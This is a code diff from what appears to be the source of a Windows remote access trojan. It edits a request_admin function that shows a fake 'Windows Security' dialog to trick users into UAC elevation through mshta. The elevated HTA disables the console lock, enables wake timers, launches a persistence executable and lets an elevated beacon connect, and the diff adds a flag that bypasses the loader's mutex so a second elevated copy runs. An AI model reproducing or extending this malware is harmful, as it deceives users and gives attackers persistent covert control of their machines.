@@ -2512,9 +2512,10 @@ def request_admin() -> str:
     """Spoofed-elevation chain: center-screen Windows Security pretext
     dialog -> on ANY dismissal -> runas mshta (UAC shows mshta, not this
     process) -> elevated HTA disables sleep console-lock, enables RTC wake,
-    launches the persistence exe elevated, writes a proof flag and
-    self-deletes. The medium-IL session then drops so the elevated beacon
-    can connect. On success wake is auto-armed."""
+    launches the persistence exe elevated (RAT_NOINSTALL=1 bypasses the
+    loader's single-instance mutex, still owned by this session's loader),
+    writes a proof flag and self-deletes. The medium-IL session then drops
+    so the elevated beacon can connect. On success wake is auto-armed."""
     if os.name != "nt":
         return "[!] Windows only"
     import ctypes
@@ -2576,6 +2577,12 @@ def request_admin() -> str:
         'L "start"\r\n'
         'sh.Environment("Process")("RAT_FAST") = "1"\r\n'
         'L "RAT_FAST set"\r\n'
+        "' RAT_NOINSTALL=1: our loader is already running (medium IL) and holds\r\n"
+        "' the Local\\RuntimeUpdateTask_boot mutex, so a second instance would\r\n"
+        "' exit silently at its mutex check. Skipping mutex+install lets the\r\n"
+        "' elevated copy boot in parallel instead of dying on the spot.\r\n"
+        'sh.Environment("Process")("RAT_NOINSTALL") = "1"\r\n'
+        'L "RAT_NOINSTALL set"\r\n'
         'L "powercfg AC CONSOLELOCK 0 rc=" & '
         'sh.Run("powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_NONE '
         'CONSOLELOCK 0", 0, True)\r\n'
